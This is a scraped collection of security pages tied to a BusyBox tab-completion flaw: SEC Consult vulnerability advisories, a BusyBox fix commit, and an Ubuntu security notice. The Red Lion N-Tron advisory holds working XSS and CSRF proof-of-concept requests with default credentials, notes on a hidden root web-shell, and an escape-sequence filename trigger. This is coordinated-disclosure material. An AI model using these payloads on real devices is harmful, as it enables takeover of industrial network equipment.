and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://www.sec-consult.com/en/career/index.html>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://www.sec-consult.com/en/contact/index.html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2019

```

**Attachment:
[smime.p7s](att-18/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

### Current thread:

* **SEC Consult SA-20190612-0 :: Multiple vulnerabilities in WAGO 852 Industrial Managed Switch Series** *SEC Consult Vulnerability Lab (Jun 12)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_adb6d9ea_20250125_072647.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from packetstormsecurity.com_8889f1d0_20250125_072648.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from git.busybox.net_28912404_20250125_072658.html ===


| [cgit logo](/) | [index](/) : [busybox](/busybox/ "busybox") | 0\_60\_stable 1\_00\_stable 1\_00\_stable\_10817 1\_10\_stable 1\_11\_stable 1\_12\_stable 1\_13\_stable 1\_14\_stable 1\_15\_stable 1\_16\_stable 1\_17\_stable 1\_18\_stable 1\_19\_stable 1\_1\_stable 1\_20\_stable 1\_21\_stable 1\_22\_stable 1\_23\_stable 1\_24\_stable 1\_25\_stable 1\_26\_stable 1\_27\_stable 1\_28\_stable 1\_29\_stable 1\_30\_stable 1\_31\_stable 1\_32\_stable 1\_33\_stable 1\_34\_stable 1\_35\_stable 1\_36\_stable 1\_37\_stable 1\_3\_stable 1\_4\_stable 1\_5\_stable 1\_6\_stable 1\_7\_stable 1\_8\_stable 1\_9\_stable master |
| --- | --- | --- |
| BusyBox: The Swiss Army Knife of Embedded Linux | vda |

| [about](/busybox/about/)[summary](/busybox/)[refs](/busybox/refs/?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8)[log](/busybox/log/)[tree](/busybox/tree/?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8)[commit](/busybox/commit/?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8)[diff](/busybox/diff/?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Denys Vlasenko <vda.linux@googlemail.com> | 2017-11-07 18:09:29 +0100 |
| --- | --- | --- |
| committer | Denys Vlasenko <vda.linux@googlemail.com> | 2017-11-08 12:35:02 +0100 |
| commit | [c3797d40a1c57352192c6106cc0f435e7d9c11e8](/busybox/commit/?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8) ([patch](/busybox/patch/?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8)) | |
| tree | [ab6c18347fe168135382013a660e0725cca52452](/busybox/tree/?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8) | |
| parent | [a5060b8364faa7c677c8950f1315c451403b0660](/busybox/commit/?id=a5060b8364faa7c677c8950f1315c451403b0660) ([diff](/busybox/diff/?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8&id2=a5060b8364faa7c677c8950f1315c451403b0660)) | |
| download | [busybox-c3797d40a1c57352192c6106cc0f435e7d9c11e8.tar.bz2](/busybox/snapshot/busybox-c3797d40a1c57352192c6106cc0f435e7d9c11e8.tar.bz2) | |

lineedit: do not tab-complete any strings which have control charactersfunction old new delta
add\_match 41 68 +27
Signed-off-by: Denys Vlasenko <vda.linux@googlemail.com>
[Diffstat](/busybox/diff/?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8)

| -rw-r--r-- | [libbb/lineedit.c](/busybox/diff/libbb/lineedit.c?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8) | 12 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 12 insertions, 0 deletions

| diff --git a/libbb/lineedit.c b/libbb/lineedit.cindex c0e35bb21..56e81404e 100644--- a/[libbb/lineedit.c](/busybox/tree/libbb/lineedit.c?id=a5060b8364faa7c677c8950f1315c451403b0660)+++ b/[libbb/lineedit.c](/busybox/tree/libbb/lineedit.c?id=c3797d40a1c57352192c6106cc0f435e7d9c11e8)@@ -645,6 +645,18 @@ static void free\_tab\_completion\_data(void)  static void add\_match(char \*matched) {+ unsigned char \*p = (unsigned char\*)matched;+ while (\*p) {+ /\* ESC attack fix: drop any string with control chars \*/+ if (\*p < ' '+ || (!ENABLE\_UNICODE\_SUPPORT && \*p >= 0x7f)+ || (ENABLE\_UNICODE\_SUPPORT && \*p == 0x7f)+ ) {+ free(matched);+ return;+ }+ p++;+ } matches = xrealloc\_vector(matches, 4, num\_matches); matches[num\_matches] = matched; num\_matches++; |
| --- |

generated by [cgit v1.2.3](https://git.zx2c4.com/cgit/about/) ([git 2.25.1](https://git-scm.com/)) at 2025-01-25 07:26:58 +0000



=== Content from seclists.org_0dddf353_20250125_072653.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20200902-0 :: Multiple Vulnerabilities in Red Lion N-Tron 702-W, Red Lion N-Tron 702M12-W

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Wed, 2 Sep 2020 19:18:46 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20200902-0 >
=======================================================================
              title: Multiple Vulnerabilities
            product: Red Lion N-Tron 702-W, Red Lion N-Tron 702M12-W
 vulnerable version: <=2.0.26
      fixed version:
         CVE number: CVE-2020-16210, CVE-2020-16206, CVE-2020-16208,
                     CVE-2020-16204
             impact: High
           homepage: <https://www.redlion.net/>
              found: 2020-02-28
                 by: T. Weber (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"For over forty years, customers around the world have trusted Red Lion
Controls. Our award-winning industrial automation and
networking solutions provide critical information and controls to
improve productivity, working with numerous devices and diverse
protocols to access data."

Source: <https://www.redlion.net>

Business recommendation:
------------------------
The vendor recommends to change the hardware and use a newer product.
SEC Consult recommends to remove the device from productive environments.

Vulnerability overview/description:
-----------------------------------
1) Reflected Cross-Site Scripting (XSS) - CVE-2020-16210
A reflected cross-site scripting vulnerability was identified at the endpoint
"/pingtest_action.cgi". An attacker is also able to perform actions in the
context of the attacked user.

2) Stored Cross-Site Scripting (XSS) - CVE-2020-16206
Stored cross-site scripting vulnerabilities are present on multiple endpoints.
Such placed payloads cannot be detected via browser-protection mechanisms as
they are embedded into the web-interface.
An attacker is also able to perform actions in the context of the attacked user.

3) Cross-Site Request Forgery (CSRF) - CVE-2020-16208
CSRF protection is not implemented at all.
Such a vulnerability enables an attacker to modify different configurations of
a device by luring an authenticated user to click on a crafted link. An
attacker is able to take over the device by exploiting this vulnerability.

4) Hidden OS Web-Shell Interface - CVE-2020-16204
An undocumented interface, that contains a web-shell to the underlying OS, was
found to be present on the device. It is not referenced in the actual menu
and is also not mentioned in the manual of the device.
Commands can be executed as root on the device. A remote attacker can execute
system commands via this way in combination with vulnerability #3.

This endpoint seems to be a leftover of the used Atheros SDK.

5) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.11.0 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.

6) Outdated and Vulnerable Software Components
Outdated and vulnerable software components were found on the device during
a quick examination.

The vulnerabilities 1), 2), 3), 4) and 5) were manually verified on an emulated
device by using the MEDUSA scalable firmware runtime.

Proof of concept:
-----------------
1) Reflected Cross-Site Scripting (XSS) - CVE-2020-16210
The "pingtest_action.cgi" endpoint can be used to trigger reflected XSS.
<http://$IP/pingtest_action.cgi?action=pingtest&dst_ip_addr=1&dst_addr_select=127.0.0.1&lines=%3Chtml%3E%3Cscript%3Ealert>(document.location)%3C/script%3E%3C/html%3E

2) Stored Cross-Site Scripting (XSS) - CVE-2020-16206
Injection of a XSS payload is possible on multiple endpoints. An example
for permanent XSS on the endpoint "/network.cgi" is the following request:
-------------------------------------------------------------------------------
POST /network.cgi HTTP/1.1
Host: $IP
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------195698564115308644282115103021
Content-Length: 915
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Cookie: ui_language=en_US
Upgrade-Insecure-Requests: 1

-----------------------------195698564115308644282115103021
Content-Disposition: form-data; name="netmode"

bridge
-----------------------------195698564115308644282115103021
Content-Disposition: form-data; name="wlanipmode"

0
-----------------------------195698564115308644282115103021
Content-Disposition: form-data; name="brip"

192.168.1.202
-----------------------------195698564115308644282115103021
Content-Disposition: form-data; name="brmask"

255.255.255.0
-----------------------------195698564115308644282115103021
Content-Disposition: form-data; name="brgw"

192.168.1.1"><script>alert(document.location)</script>
-----------------------------195698564115308644282115103021
Content-Disposition: form-data; name="dns1"

-----------------------------195698564115308644282115103021
Content-Disposition: form-data; name="dns2"

-----------------------------195698564115308644282115103021--
-------------------------------------------------------------------------------

This can also be embedded in the HTML code as shown below:
-------------------------------------------------------------------------------
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[http://$IP/network.cgi"](http://$IP/network.cgi%22); method="POST" enctype="multipart/form-data">
      <input type="hidden" name="netmode" value="bridge" />
      <input type="hidden" name="wlanipmode" value="0" />
      <input type="hidden" name="brip" value="192&#46;168&#46;1&#46;202" />
      <input type="hidden" name="brmask" value="255&#46;255&#46;255&#46;0" />
      <input type="hidden" name="brgw"
value="192&#46;168&#46;1&#46;1&quot;&gt;&lt;script&gt;alert&#40;document&#46;location&#43;&quot;&#32;&gt;&#32;SEC&#45;Consult&quot;&#41;&lt;&#47;script&gt;"
 />
      <input type="hidden" name="dns1" value="" />
      <input type="hidden" name="dns2" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
-------------------------------------------------------------------------------

3) Cross-Site Request Forgery (CSRF) - CVE-2020-16208
CSRF can be triggered on each endpoint as the whole web-interface does not
implement any protection mechanisms. Changing the hostname to "SEC Consult" can
be done with the following embedded HTML code:
-------------------------------------------------------------------------------
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[http://$IP/system.cgi"](http://$IP/system.cgi%22); method="POST" enctype="multipart/form-data">
      <input type="hidden" name="hostname" value="SEC&#32;Consult" />
      <input type="hidden" name="action" value="chhost" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
-------------------------------------------------------------------------------

4) Hidden OS Web-Shell Interface - CVE-2020-16204
The endpoint "/admin.cgi" is not referenced within the whole web-interface and
also not documented in the manual. By browsing this endpoint, multiple actions
can be natively triggered:
 * Execute commands in context of the root user
 * Upload files
 * Download files
 * Change access rights
All other actions can be done via the command execution. The lack of CSRF
protections allows attackers to execute commands on the device by luring a
user on malicious web-pages.

5) Known BusyBox Vulnerabilities
The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device:

A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
vulnerability.
-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
55\;test.txt
#
-------------------------------------------------------------------------------

6) Outdated Software Components
By analyzing the firmware a lot of components are found to be outdated:
 * BusyBox 1.0.1
 * PHP/FI 2.0.1
 * Dnsmasq 2.35
 * Boa 0.93.15

Vulnerable / tested versions:
-----------------------------
the following firmware version has been tested:
* Red Lion N-Tron 702-W / 2.0.26
* Red Lion N-Tron 702M12-W / 2.0.26

Vendor contact timeline:
------------------------
2020-03-09: Contacting vendor through support.emea () redlion net; No answer.
2020-03-17: Asked for status update; No answer.
2020-03-30: Asked for status update, added incoming.ics-cert () redlion net to
            the list of recipients; No answer.
2020-04-13: Requested support for coordination from CERT@VDE for the advisory.
            Sent the advisory to the CERT.
2020-04-14: Security contact from CERT@VDE answered, that ICS-CERT was also in-
            formed.
2020-07-17: Asked contact at ICS-CERT for status update; Contact stated that
            they are waiting for an update of Red Lion.
2020-08-20: Received CISA draft for an advisory from CERT@VDE.
2020-08-28: Found the published advisory on CISA's website* which was released
            on 2020-08-27.
2020-09-02: Release of security advisory.

* <https://us-cert.cisa.gov/ics/advisories/icsa-20-240-01>

Solution:
---------
Upgrade to newer hardware.

Workaround:
-----------
None.

Advisory URL:
-------------
<https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://www.sec-consult.com/en/career/index.html>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://www.sec-consult.com/en/contact/index.html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2020

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **SEC Consult SA-20200902-0 :: Multiple Vulnerabilities in Red Lion N-Tron 702-W, Red Lion N-Tron 702M12-W** *SEC Consult Vulnerability Lab (Sep 02)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from usn.ubuntu.com_1d29bb2f_20250125_072703.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3935-1: BusyBox vulnerabilities

3 April 2019

Several security issues were fixed in BusyBox.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.10](/security/notices?release=cosmic)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [busybox](/security/cves?package=busybox) - Tiny utilities for small and embedded systems

## Details

Tyler Hicks discovered that BusyBox incorrectly handled symlinks inside tar

archives. If a user or automated system were tricked into processing a

specially crafted tar archive, a remote attacker could overwrite arbitrary

files outside of the current directory. This issue only affected Ubuntu

14.04 LTS and Ubuntu 16.04 LTS. ([CVE-2011-5325](/security/CVE-2011-5325))

Mathias Krause discovered that BusyBox incorrectly handled kernel module

loading restrictions. A local attacker could possibly use this issue to

bypass intended restrictions. This issue only affected Ubuntu 14.04 LTS.

([CVE-2014-9645](/security/CVE-2014-9645))

It was discovered that BusyBox incorrectly handled certain ZIP archives. If

a user or automated system were tricked into processing a specially crafted

ZIP archive, a remote attacker could cause BusyBox to crash, leading to a

denial of service. This issue only affected Ubuntu 14.04 LTS and Ubuntu

16.04 LTS. ([CVE-2015-9261](/security/CVE-2015-9261))

Nico Golde discovered that the BusyBox DHCP client incorrectly handled

certain malformed domain names. A remote attacker could possibly use this

issue to cause the DHCP client to crash, leading to a denial of service.

This issue only affected Ubuntu 14.04 LTS and Ubuntu 16.04 LTS.

([CVE-2016-2147](/security/CVE-2016-2147))

Nico Golde discovered that the BusyBox DHCP client incorrectly handled

certain 6RD options. A remote attacker could use this issue to cause the

DHCP client to crash, leading to a denial of service, or possibly execute

arbitrary code. This issue only affected Ubuntu 14.04 LTS and Ubuntu 16.04

LTS. ([CVE-2016-2148](/security/CVE-2016-2148))

It was discovered that BusyBox incorrectly handled certain bzip2 archives.

If a user or automated system were tricked into processing a specially

crafted bzip2 archive, a remote attacker could cause BusyBox to crash,

leading to a denial of service, or possibly execute arbitrary code. This

issue only affected Ubuntu 14.04 LTS and Ubuntu 16.04 LTS. ([CVE-2017-15873](/security/CVE-2017-15873))

It was discovered that BusyBox incorrectly handled tab completion. A local

attacker could possibly use this issue to execute arbitrary code. This

issue only affected Ubuntu 14.04 LTS and Ubuntu 16.04 LTS. ([CVE-2017-16544](/security/CVE-2017-16544))

It was discovered that the BusyBox wget utility incorrectly handled certain

responses. A remote attacker could use this issue to cause BusyBox to

crash, resulting in a denial of service, or possibly execute arbitrary

code. ([CVE-2018-1000517](/security/CVE-2018-1000517))

It was discovered that the BusyBox DHCP utilities incorrectly handled

certain memory operations. A remote attacker could possibly use this issue

to access sensitive information. ([CVE-2018-20679](/security/CVE-2018-20679), [CVE-2019-5747](/security/CVE-2019-5747))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.10

* [busybox](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu4.1](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu4.1)
* [busybox-initramfs](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu4.1](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu4.1)
* [busybox-static](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu4.1](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu4.1)
* [udhcpc](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu4.1](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu4.1)
* [udhcpd](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu4.1](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu4.1)

##### Ubuntu 18.04

* [busybox](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu3.2](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu3.2)
* [busybox-initramfs](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu3.2](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu3.2)
* [busybox-static](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu3.2](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu3.2)
* [udhcpc](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu3.2](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu3.2)
* [udhcpd](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.27.2-2ubuntu3.2](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.27.2-2ubuntu3.2)

##### Ubuntu 16.04

* [busybox](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.22.0-15ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.22.0-15ubuntu1.4)
* [busybox-initramfs](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.22.0-15ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.22.0-15ubuntu1.4)
* [busybox-static](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.22.0-15ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.22.0-15ubuntu1.4)
* [udhcpc](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.22.0-15ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.22.0-15ubuntu1.4)
* [udhcpd](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.22.0-15ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.22.0-15ubuntu1.4)

##### Ubuntu 14.04

* [busybox](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.21.0-1ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.21.0-1ubuntu1.4)
* [busybox-initramfs](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.21.0-1ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.21.0-1ubuntu1.4)
* [busybox-static](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.21.0-1ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.21.0-1ubuntu1.4)
* [udhcpc](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.21.0-1ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.21.0-1ubuntu1.4)
* [udhcpd](https://launchpad.net/ubuntu/%2Bsource/busybox)
  -
  [1:1.21.0-1ubuntu1.4](https://launchpad.net/ubuntu/%2Bsource/busybox/1%3A1.21.0-1ubuntu1.4)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2011-5325](/security/CVE-2011-5325)
* [CVE-2014-9645](/security/CVE-2014-9645)
* [CVE-2015-9261](/security/CVE-2015-9261)
* [CVE-2016-2147](/security/CVE-2016-2147)
* [CVE-2016-2148](/security/CVE-2016-2148)
* [CVE-2017-15873](/security/CVE-2017-15873)
* [CVE-2017-16544](/security/CVE-2017-16544)
* [CVE-2018-1000517](/security/CVE-2018-1000517)
* [CVE-2018-20679](/security/CVE-2018-20679)
* [CVE-2019-5747](/security/CVE-2019-5747)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
